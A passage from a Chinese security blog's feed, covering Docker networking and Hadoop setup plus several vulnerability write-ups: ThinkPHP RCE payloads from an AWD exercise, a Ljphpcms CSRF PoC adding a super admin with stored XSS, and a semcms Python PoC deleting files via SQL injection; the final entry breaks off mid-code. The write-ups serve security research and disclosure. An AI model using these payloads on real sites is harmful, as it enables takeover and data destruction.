    <content type="text"><![CDATA[0x00 前言在最近使用docker搭建环境的过程中，发现docker容器默认的网络模式并不能很好的满足需求，然后便查看了一下docker关于网络配置的官方文档，发现在官方文档中,给出了五种docker的网络模式，还是能比较全面的满足各种需求的，下面介绍一下这几种模式。 0x01 bridge模式bridge模式，这是docker容器启动时默认的网络模式，当启动容器时不提供--net参数时，docker容器便默认以这种模式配置网络环境。这也是在使用docker容器时，最常用的网络模式。关于桥接模式，官方文档时这样说的当您的应用程序在需要通信的独立容器中运行时，通常会使用桥接网络。简单画了个图帮助理解这种模式 实际演示：首先使用默认模式即桥接模式启动两个docker容器,并查看其ip测试两台容器间互通通过命令docker exec bridge1 ip addr show看到两个容器均虚拟出了自己的网卡eth0查看宿主机网卡，可发现多出来docker0，而此网卡即为各桥接模式启动的容器的网关同时宿主机上还多出来两个veth开头的网卡，其伴随着桥接模式容器的eth0网卡出现而出现。其作用为连通docker0与容器内网卡eth0。因此docker0并不只是一个简单的网卡了，而是一个网桥。 0x02 host模式使用host模式时容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。实际演示docker run -itd --net=host --name=host awd_zentao /bin/bash查看其网卡发现其与主机一样 0x03 container模式该模式类似于host模式，只不过host模式是主机与容器共享Network Namespace,而container模式是容器之间共享Network Namespace。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。实际演示：其配置方式为--net=container:&lt;name_or_id&gt;这里选择与之前的bridge1共享 0x04 none模式使用none模式不会对docker容器进行任何网络配置，只有lo本地环回网络，Docker容器没有网卡、IP、路由等信息。需要我们自己为Docker容器添加网卡、配置IP等。实际演示： 0x05 macvlan模式本次学习正式因为想搭建docker集群与宿主机在同一个c段，以使宿主机同c段主机可以连同docker容器，本来也可以使用bridge模式加端口映射的方法，但发现使用macvlan方式更为合适。macvlan模式可以创建出一个新的自定义模式，其新启动的容器可以按新的模式配置网络环境。实例演示：创建新的macvlan1docker network create -d macvlan --subnet=192.168.111.0/24 --gateway=192.168.111.1 -o parent=ens33 gitlab-net 使用docker network ls可以看到新创建的gitlab-net网络 使用docker run --net=gitlab-net --ip=192.168.111.201 -dit --name test1 awd_zentao即可创建新的容器，可通过--net=gitlab-net指定其为新的模式,--ip参数指定容器ip查看其网卡信息 相对于前面几种模式，该模式更加灵活，可根据实际需求配置出新的模式，满足较为复杂的网络需求。 0x06 overlay模式overlay模式可用于连接不同机器上的docker容器，允许不同机器上的容器相互通信，同时支持对消息进行加密。笔者暂时未用过该模式，具体可参考https://docs.docker.com/network/overlay/]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Hadoop JAVA API 远程连接HDFS]]></title>
    <url>%2F%E4%BD%BF%E7%94%A8Hadoop-JAVA-API-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5HDFS%2F</url>
    <content type="text"><![CDATA[0x00 前言关于hadoop的搭建，可以参考之前的一篇文章Centos7搭建Hadoop伪分布式集群详细步骤本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS） 0x01 本地操作HDFS在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。 首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件系统，既然是文件系统，其就可以执行跟普通文件系统一样的操作，例如文件操作，目录操作等。下面演示几个简单的例子。 列出目录文件hadoop fs -ls \ 创建文件hadoop fs -touchz /hello 更多命令参考hadoop HDFS常用文件操作命令 0x02 IDEA远程连接HDFS准备环境首先在windows环境下安装hadoop并配置环境变量。windows下配置java jdk。下载winutils：https://github.com/steveloughran/winutils按照自己hadoop版本选择hadoop.dll winutils.exe放到hadoop bin目录下 建立工程在IDEA下新建Maven工程 创建过程中右下角会出现import提醒，点击import。 创建完成后下载对应版本的hadoop pom.xml文件这里我的为12345678910111213141516171819202122232425&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-common&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-mapreduce-client-core&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-client&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.hadoop&lt;/groupId&gt; &lt;artifactId&gt;hadoop-hdfs&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 将之前配置的core-site.xml hdfs-site.xml log4j.properties复制到resources目录 目录结构如下 测试新建class1234567891011121314151617181920212223242526272829303132333435package hadoop; import org.apache.hadoop.conf.Configuration; import org.apache.hadoop.fs.FSDataInputStream; import org.apache.hadoop.fs.FSDataOutputStream; import org.apache.hadoop.fs.FileSystem; import org.apache.hadoop.fs.Path; import org.apache.hadoop.io.IOUtils;public class hadoop&#123; public static void main(String[] args)&#123; try&#123; String filename = "hdfs://192.168.111.141:9000/user/input/boogle.txt"; Configuration configuration = new Configuration(); FileSystem fileSystem = FileSystem.get(configuration); if(fileSystem.exists(new Path(filename))) &#123; System.out.println("文件存在"); &#125; else&#123; System.out.println("文件不存在"); &#125; Path inFile = new Path("/user/input/boogle.txt"); FSDataOutputStream os = fileSystem.create(inFile); os.writeUTF("Chinese Hadoop Community"); os.flush(); os.close(); FSDataInputStream is = fileSystem.open(inFile); IOUtils.copyBytes(is,System.out,1024,true); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 按照自己环境修改一下上面的代码。 之前本地搭建的时候连接hdfs用的localhost，此处远程连接需换成ip。如我的core-site.xml 查看运行结果 详细代码常用hdfs java api已封装好，直接在main函数中调用即可。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108package hadoop; import java.io.IOException; import java.net.URI; import java.net.URISyntaxException; import org.apache.hadoop.conf.Configuration; import org.apache.hadoop.fs.FSDataInputStream; import org.apache.hadoop.fs.FSDataOutputStream; import org.apache.hadoop.fs.FileSystem; import org.apache.hadoop.fs.Path; import org.apache.hadoop.io.IOUtils; import org.apache.hadoop.fs.FileStatus;public class Hdfs &#123; static Configuration conf = new Configuration(); static FileSystem hdfs; public static void init()&#123; try&#123; hdfs = FileSystem.get(conf); &#125; catch( IOException e) &#123; e.printStackTrace(); &#125;&#125; public static void main(String[] args)&#123; try &#123; listFiles("/user"); createDir("/user/input"); createFile("/user/input/test1.txt","HelloWoRLd ,It is 2019"); createFile("/user/input/test2.txt","hello boogle ,Your Site Is :zhengbao,wang"); listFiles("/user/input"); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void createDir(String dir) throws IOException &#123; init(); //System.out.println("newdir \t" + conf.get("fs.defaultFS") + dir); Path path = new Path(dir); hdfs.mkdirs(path); System.out.println("newdir \t" + conf.get("fs.defaultFS") + dir); &#125; //copy from local file to HDFS file public static void copyFile(String localSrc,String hdfsDst) throws IOException &#123; init(); Path src = new Path(localSrc); Path dst = new Path(hdfsDst); hdfs.copyFromLocalFile(src, dst); //list all the files in thecurrent direction FileStatus files[] = hdfs.listStatus(dst); System.out.println("Uploadto \t" + conf.get("fs.defaultFS") + hdfsDst); for (FileStatus file : files) &#123; System.out.println(file.getPath()); &#125; &#125; //create a new file public static void createFile(String fileName,String fileContent) throws IOException &#123; init(); Path dst = new Path(fileName); byte[] bytes =fileContent.getBytes(); FSDataOutputStream output =hdfs.create(dst); output.write(bytes); System.out.println("newfile \t" + conf.get("fs.defaultFS") + fileName); &#125; //list all files public static void listFiles(String dirName)throws IOException &#123; init(); Path f = new Path(dirName); FileStatus[] status =hdfs.listStatus(f); System.out.println(dirName +" has all files:"); for (int i = 0; i&lt;status.length; i++) &#123; System.out.println(status[i].getPath().toString()); &#125; &#125; public static void deleteFile(String fileName)throws IOException &#123; init(); Path f = new Path(fileName); boolean isExists =hdfs.exists(f); if (isExists) &#123; //if exists, delete boolean isDel =hdfs.delete(f,true); System.out.println(fileName+ " delete? \t" + isDel); &#125; else &#123; System.out.println(fileName+ " exist? \t" + isExists); &#125; &#125;&#125; 0x03 问题解决因为之前hadoop环境已经搭好，容易出现的问题主要是配置IDEA配置问题和网络连接问题。 关于配置没有详细讲，但是要按照每一个步骤自己操作为，并无难度，勿丢步骤即可。 关于网络连接，主要出现的问题在于防火墙禁止连接9000端口 可通过修改hosts或者修改防火墙配置]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内部AWD攻防对抗web记录]]></title>
    <url>%2F%E5%86%85%E9%83%A8AWD%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97web%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 前言团队内部进行了一次awd演练，其中web服务器环境基于thinkphp v5.0.7。包含两个个框架通用漏洞，四个魔改过的漏洞，特此记录一下。 0x01 thinkphp5 Request 远程代码执行漏洞该漏洞详情及修复可见本人博客thinkphp5 Request 远程代码执行漏洞分析问题出在核心类Request的method方法。由于未对传入的$method进行限制，导致可以对本类任意方法进行调用且参数可控。payload12//post_method=__construct&amp;method=get&amp;filter=system&amp;boo=whoami 0x02 thinkphp5.x 远程代码执行漏洞该漏洞详情及修复可见本人博客thinkphp5.x 远程代码执行漏洞漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞payload1?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1] 0x03 thinkphp 缓存函数设计缺陷 getshell该漏洞详情及修复可见本人博客thinkphp 缓存函数设计缺陷 getshell 漏洞成因是因为thinkphp缓存函数未对其缓存内容进行过滤就直接写入缓存文件。该漏洞利用需要能够控制缓存内容并且猜解缓存文件。这里靶场环境给出了这些很好的条件。 首先漏洞出现在后台网站配置，可以使用弱口令admin admin登陆。配置后调用save方法保存配置内容，其内容未经过过滤保存到数据库。当页面再次载入会进入缓存函数，将提交的内容直接进行缓存。这里很贴心的是直接将缓存目录输出了，不需要进行猜测了。 0x04 sql注入漏洞问题出现再在index.php/index/index/shipinok这里直接将获取的ip带入sql查询跟进getIP()函数，发现未对ip进新过滤。直接构造X-Forwarded-For 0x05 任意文件包含在推广处直接通过post方式获取内容进行了包含 0x06 任意文件上传该漏洞对thinkphp file类进行了魔改，使上传文件验证规则为空，造成任意文件上传。文件名为MD5(filename+’x’)在多处上传中均存在该问题。这里以代理后台头像上传为例然后得到文件保存位置即可。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7搭建Hadoop伪分布式集群详细步骤]]></title>
    <url>%2FCentos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4%2F</url>
    <content type="text"><![CDATA[0x00 前言Apache Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。它支持在商品硬件构建的大型集群上运行的应用程序。此处仅使用一台虚拟机进行hadoop集群搭建，因此称为伪分布式。 0x01 安装JAVA环境-jdk1.8下载安装包安装包可根据需要从官网下载也可以在centos中使用wget命令下载，如下图提取下载链接12#此链接很有可能失效，如失效请重新提取wget https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk-8u201-linux-x64.tar.gz?AuthParam=1553514841_9cc3afa073df0a90e3fbb39088a2cde9 新建安装目录并解压12sudo mkdir /usr/local/java/sudo tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/java/ 配置环境变量123456789# 打开配置文件vi ~/.bashrc # 添加并保存export JAVA_HOME=/usr/local/java/jdk1.8.0_201 #注意此处jdk目录与你解压目录相同export JRE_HOME=$JAVA_HOME/jreexport CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/libexport PATH=$JAVA_HOME/bin:$PATH # 使环境变量生效source ~/.bashrc 测试是否配置成功然后可通过java -version查看是否配置成功 0x02 下载Hadoop并配置下载从官网下载:http://mirrors.shu.edu.cn/apache/hadoop/common/hadoop-3.2.0/hadoop-3.2.0.tar.gz下载后解压到想要放置的目录即可。 配置环境变量12345678# 打开配置文件vi ~/.bashrc # 添加并保存export HADOOP_HOME=/home/wzb/hadoop-3.2.0 #注意此处hadoop目录与你解压目录相同export PATH=$PATH:$HADOOP_HOME/bin:$HADOOP_HOME/sbin# 使环境变量生效source ~/.bashrc 配置hadoop-env.sh中的$JAVA_HOME1vi hadoop-3.2.0/etc/hadoop/hadoop-env.sh 测试是否配置成功hadoop version 0x03 配置ssh免密登陆因为hadoop集群在进行验证时采用ssh公钥登陆，此处配置伪分布式集群，以本地免密登陆为例。 安装centos默认安装了openssh，如未安装，请先进行安装1yum install openssh-server -y 配置打开openssh主配置文件1sudo vi /etc/ssh/sshd_config 需开启并配置的文件如下，其他根据需要可自由配置12345678Port 22ListenAddress 0.0.0.0ListenAddress ::PermitRootLogin noStrictModes noPubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keysPasswordAuthentication yes 配置完成后重启服务以使配置生效1sudo service sshd restart 生成公钥123456ssh-keygen -t rsa -P '' #直接回车生成公钥和私钥cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys #将本机的公钥添加进authorized_keys中，这样允许本机通过ssh的形式免密码登录，如配置其他主机免密登陆，请将其他主机公钥配置到`authorized_keys`sudo chmod 700 ~/.ssh #配置相应权限sudo chmod 600 ~/.ssh/authorized_keys 测试本地免密登陆1ssh localhost 配置成功则无需密码直接登陆成功 如果失败请使用ssh -vvv locoalhost进行debug排查 0x04 配置hadoop伪分布式集群配置hadoop运行核心文件core-site.xml123456&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://localhost:9000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 配置HDFS分布式储存的配置hdfs-site.xml123456789101112131415&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.name.dir&lt;/name&gt; &lt;value&gt;/home/wzb/hdfs-data/name&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.data.dir&lt;/name&gt; &lt;value&gt;/home/wzb/hdfs-data/data&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 数据目录格式化1hdfs namenode -format 出现INFO common.Storage: Storage directory /home/wzb/hdfs-data/name has been successfully formatted.字样时表明格式化目录成功 启动Hadoop1start-all.sh 启动过程中下面进程无错误启动即启动成功。12345Starting namenodesStarting datanodesStarting secondary namenodesStarting resourcemanagerStarting nodemanagers 查看java进程使用命令jps可发现相关进程启动成功 查看端口netstat -ntpl |grep java可与上面进程号比对查看相关进程部署在哪个端口。 访问端口http://127.0.0.1:8088 http://127.0.0.1:9870 注意事项本地搭建伪分布式会面临设备关机重启，请在关机前执行stop-all.sh关闭所有相关进程。 0x05 总结在配置环节可能出现多处未知错误，可通过排查log记录解决。如免密登陆及部署hadoop时可能会出现未知错误。 免密登陆出现的错误可通过ssh -vvv localhost查看debug情况，进行相应错误的处理。 部署hadoop过程中，如有关进程未正常启动可通过hadoop目录下的logs文件查看启动失败的进程log,进行相应处理。]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ljphpcms_v1.03代码审计之csrf&&xss]]></title>
    <url>%2FLjphpcms-v1-03%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bcsrf-xss%2F</url>
    <content type="text"><![CDATA[0x00 前言此次审计为Ljphpcms_v1.03最新版demo:http://demo.8cms.com/ 0x01 CSRF添加超级管理员代码分析后台多处操纵存在可利用的CSRF,这里以添加超级管理为例。在后台/admincp.php?c=admin&amp;a=add处可以添加超级管理员。在添加管理员过程中，进验证了权限，未作其他防御CSRF措施 添加管理员测试通过csrf添加管理员测试之前数据库内容测试之后，成功添加l3oog1e用户 CSRF POC123456789101112131415161718&lt;html&gt;&lt;iframe style="width:0;height:0;border:0; border:none;" name="csrf-frame"&gt;&lt;/iframe&gt;&lt;form name="adduser" action="http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=admin&amp;a=saveadd" method="post" target="csrf-frame"&gt; &lt;input type="submit"&gt; &lt;input type="hidden" name="adminname" value="l3oog1e"&gt; &lt;input type="hidden" name="password" value="123123"&gt; &lt;input type="hidden" name="confirmpassword" value="123123"&gt; &lt;input type="hidden" name="flag" value="1"&gt; &lt;input type="hidden" name="groupid" value="0"&gt; &lt;input type="hidden" name="memo" value="csrf_test"&gt; &lt;/form&gt;&lt;script&gt;document.forms.adduser.submit();&lt;/script&gt;&lt;/html&gt; 0x02 后台存储型xss代码分析问题出现在后台站点设置处http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting&amp;a=run在\source\control\admincp\setting.php中，对站点设置提交的内容进行了接收处理。123456789101112131415161718192021222324public function action_savebase() &#123; $this-&gt;checkAuth('savebase'); $args = array(); $args = $this-&gt;_validBase(); $model = parent::model('setting', 'am'); // print_r($args);die; $optionname='site_base'; $lang= parent::$lang; if($lang!='cn')&#123; $optionname=$optionname."_".$_SESSION['lang']; &#125; $tjcode=$args['tjcode']; unset($args['tjcode']); $result = $model-&gt;doSave($optionname, $args,$tjcode); unset($model); if (true === $result) &#123; $this-&gt;log('setting', '站点设置', 1); XHandle::halt('保存成功', $this-&gt;cpfile.'?c=setting', 0); &#125; else &#123; $this-&gt;log('setting', '站点设置', 0); XHandle::halt('保存失败', '', 1); &#125; &#125; 代码中$args = $this-&gt;_validBase();接受到的是全部内容但是在下面，又通过$tjcode=$args[&#39;tjcode&#39;];把tjcode内容单出提取出来了。 然后进入到$result = $model-&gt;doSave($optionname, $args,$tjcode);跟进doSave操作12345678910111213public function doSave($option, $array,$tjcode) &#123; $data = serialize($array); if($option=="site_base" || $option=="site_base_en")&#123; parent::loadLib('option'); XOption::updateOption1($option, $data,$tjcode); &#125; else &#123; parent::loadLib('option'); XOption::updateOption($option, $data); &#125; return true;&#125; 看以看到这里其他内容进行了序列化处理，而tjcode却没进行任何处理，之后便进入XOption::updateOption1($option, $data,$tjcode);执行更新操作。跟进updateOption1,发现tjcode依旧没做任何处理 盗取cookie上面说到的tjcode即为流量统计代码处的内容在流量统计代码处插入xss脚本12poc boogle&lt;/textarea&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 执行更新操作，查看数据库，已被插入xss脚本 当不同用户登陆时 用户boogle管理员 0x03 SSRF、XSS结合后台的XSS，还是有些鸡肋，普通用户可能并不具备修改站点设置的权限。这里结合前面的csrfpoc12345678910111213141516171819202122232425&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://127.0.0.1/Ljphpcms_V1.03/admincp.php?c=setting" method="POST"&gt; &lt;input type="hidden" name="a" value="savebase" /&gt; &lt;input type="hidden" name="sitename" value="�&amp;#137;&amp;#175;�&amp;#178;&amp;#190;PHP�&amp;#188;&amp;#129;�&amp;#184;&amp;#154;�&amp;#189;&amp;#145;�&amp;#171;&amp;#153;�&amp;#174;&amp;#161;�&amp;#144;&amp;#134;�&amp;#179;&amp;#187;�&amp;#187;&amp;#159;" /&gt; &lt;input type="hidden" name="siteurl" value="http&amp;#58;&amp;#47;&amp;#47;localhost&amp;#47;ljcms&amp;#47;" /&gt; &lt;input type="hidden" name="icpcode" value="浜&amp;#172;ICP�&amp;#164;&amp;#135;08002262�&amp;#143;&amp;#183;" /&gt; &lt;input type="hidden" name="sitephone" value="010&amp;#45;81991660" /&gt; &lt;input type="hidden" name="siteqq" value="1665976568" /&gt; &lt;input type="hidden" name="siteemail" value="82993936&amp;#64;qq&amp;#46;com" /&gt; &lt;input type="hidden" name="siteaddress" value="�&amp;#140;&amp;#151;浜&amp;#172;�&amp;#184;&amp;#130;�&amp;#184;&amp;#176;�&amp;#143;&amp;#176;�&amp;#140;虹&amp;#167;&amp;#145;�&amp;#138;&amp;#128;�&amp;#155;&amp;#173;�&amp;#175;哄&amp;#190;&amp;#183;�&amp;#184;&amp;#173;�&amp;#191;&amp;#131;4�&amp;#143;&amp;#183;�&amp;#165;&amp;#188;" /&gt; &lt;input type="hidden" name="longitude" value="116&amp;#46;304724" /&gt; &lt;input type="hidden" name="latitude" value="39&amp;#46;835519" /&gt; &lt;input type="hidden" name="tjcode" value="boogle&lt;/textarea&gt;&lt;script&gt;alert('boogle')&lt;/script&gt;" /&gt; &lt;input type="hidden" name="qrcode" value="http&amp;#58;&amp;#47;&amp;#47;pic49&amp;#46;nipic&amp;#46;com&amp;#47;file&amp;#47;20140926&amp;#47;9422602&amp;#95;102539153000&amp;#95;2&amp;#46;jpg" /&gt; &lt;input type="hidden" name="logo" value="data&amp;#47;attachment&amp;#47;201811&amp;#47;01&amp;#47;0b4affc887ed2b08&amp;#46;png" /&gt; &lt;input type="hidden" name="logowidth" value="232" /&gt; &lt;input type="hidden" name="logoheight" value="60" /&gt; &lt;input type="hidden" name="btn&amp;#95;save" value="�&amp;#155;&amp;#180;�&amp;#150;&amp;#176;�&amp;#191;&amp;#157;�&amp;#173;&amp;#152;" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 0x04 修复方式增加防御csrf的验证1token、referer、验证码]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burpsuite安装分块传输插件]]></title>
    <url>%2Fburpsuite%E5%AE%89%E8%A3%85%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[0x01 前言关于分块传输的用处不多解释，感谢c0ny1编写的自动化插件,项目地址：https://github.com/c0ny1/chunked-coding-converter 0x02 mvn package命令打包下载完成后可直接在pom.xml根目录执行mvn package进行打包，成功后生成一个target文件夹，里面有打包好的burpsuite插件。 IDE打包我这里就用的myeclipse。这里简述一下步骤首先通过file-&gt;import导入目标，选择Existing Maven Projects执行下一步，选择下载好的包含pom.xml的上级目录即可然后稍等一会即可在Packahe Explorer视图中看到整个项目然后在pom.xml上右键执行run as-&gt;maven package操作。如果没有maven package操作可以选择maven build，新建一个，填写Goals为package然后等待其打包完成即可，完成后在target目录中机会生成目标.jar文件 然后启动burpsuite，执行插件添加操作，选择刚才打包好的jar文件 安装成功会有提示然后就可以享受这一利器带来的便利了]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8任意文件刪除]]></title>
    <url>%2Fsemcms-php-v3-8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%AA%E9%99%A4%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第五篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网: http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 任意文件删除首先在后台Include/function.php功能函数文件中，有一个执行文件删除的函数Delfile()123456789101112 //删除指定文件function Delfile($filename)&#123; if(file_exists($filename))&#123; unlink($filename); &#125; $filename=str_replace("prdoucts/", "prdoucts/small/", $filename); if(file_exists($filename))&#123; unlink($filename); &#125; &#125; 全局搜索查看在哪里调用了该函数。发现在SEMCMS_Function.php中有多次调用这里随便跟踪一个，进入到SEMCMS_Function.php第921行1234$query=$db_conn-&gt;query("select * from sc_images WHERE ID in ($area_arr)"); while($row=mysqli_fetch_array($query))&#123; Delfile($row['images_url']); &#125; 可以发现应该是一个图片删除操作，图片目录保存在数据表sc_images中。到数据库中查看可以验证这一点 那么此时便可以看看$area_arr变量是否可控，从而改变sql查询的结果，达到任意文件删除。继续向上跟踪area_arr变量。在该文件开头可以看到定义了area_arr数组，并且是由POST方式传递进来的AID得到的。这里小伙伴们又要开始惊喜了，因为前面的分析分章不只出现这一处问题了,我们知道后台所有页面均包含了contorl.php对GET传来的数据进行了清洗。而这里偏偏却用了POST方式来接收数据，继续跟踪改变量后，发现到拼接进sql语句再到进入文件删除函数过程中未进行其他任何过滤。 SEMCMS_Function.php 919行后台Include/function.php 如上图显示，网站根目录下boogle.php已被成功删除。 0x02 poc12345678910111213141516import requests#[+]Author : boogle#[+]Blog :https://boogle.github.io/delete_file = "'../test.php'"payload = "-1) union select 1,"+delete_file+",3,4,5-- -"burp0_url = "http://127.0.0.1:80/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php?Class=Deleted&amp;CF=Images"burp0_headers = &#123;"Cache-Control": "max-age=0", "Origin": "http://127.0.0.1", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "http://127.0.0.1/semcms_php_v3.8/9GJQNH_Admin/SEMCMS_Images.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"&#125;burp0_data=&#123;"AID[]": payload&#125;requests.post(burp0_url, headers=burp0_headers, data=burp0_data)print "[+]delete Success!" 0x03 修复方法在contorl.php中增加对POST的过滤。1234567if (isset($_POST))&#123;$PostArray=$_POST;&#125;else&#123;$PostArray='';&#125; //post foreach ($PostArray as $value)&#123; //post verify_str($value); &#125;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>0day挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[semcms_php_v3.8 后台注入getshell]]></title>
    <url>%2Fsemcms-php-v3-8-%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5getshell%2F</url>
    <content type="text"><![CDATA[0x00 前言此篇为审计semcms_php_v3.8的第四篇文章 SemCms是一套开源外贸企业网站管理系统，主要用于外贸企业，兼容IE、Firefox 等主流浏览器。SemCms非常适合在外贸企业，电子商务互联网应用上使用，2009年12月首次发布以来，SemCms依靠出色的用户体验和领先的技术不断扩大外贸场占有率，目前在国内已经成为最受欢迎的英文外贸网站之一。官网:http://www.sem-cms.com/审计版本为最新php版 v3.8 0x01 后台sql注入绕过过滤函数写文件前面三篇审计文章中，注入过程中均受到了inject_check_sql()过滤函数的影响，导致select`outfile`等无法使用。而且通过前面的审计，我们已有两种方法进入后台，此次继续向后台进发。123function inject_check_sql($sql_str) &#123; return preg_match('/select|insert|=|%|&lt;|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str);&#125; 本次后台的注入点将绕过该过滤函数，执行更多的操作，运气好的话，更会直接getshell。下面开始审计过程漏洞触发点在后台SEMCMS_Products.php在18行这里接受searchml竟然使用了REQUEST方式，因为前面都包含了control.php，在该函数中均GET得到的数据进行了清洗123456789// 防sql入注if (isset($_GET))&#123;$GetArray=$_GET;&#125;else&#123;$GetArray='';&#125; //get foreach ($GetArray as $value)&#123; //get verify_str($value); &#125; 而此次使用了REQUEST来获取数据，如入无人之地，继续跟踪该变量CatID的走向还是在该文件的132，可以看到CatID变量进入了prolmid函数1234567891011121314151617181920212223if ($CatID!="" &amp;&amp; $Searchp!="")&#123; $flID=prolmid($CatID,$db_conn); $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and products_name like '%".$Searchp."%' and $flID"); &#125;elseif($CatID!="" &amp;&amp; $Searchp=="")&#123; $flID=prolmid($CatID,$db_conn); $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and $flID"); &#125;elseif($CatID=="" &amp;&amp; $Searchp!="")&#123; $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and products_name like '%".$Searchp."%'"); &#125;elseif($indextjs==1)&#123; $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"]." and products_index=1 "); &#125;else&#123; $sql=$db_conn-&gt;query("select * from sc_products where languageID=".$_GET["lgid"].""); &#125; 跟进prolmid123456789101112131415function prolmid($ID,$db_conn)&#123; $str=""; $strs=""; $query=$db_conn-&gt;query("select ID from sc_categories where LOCATE(',".$ID.",', category_path)&gt;0 and category_open=1"); 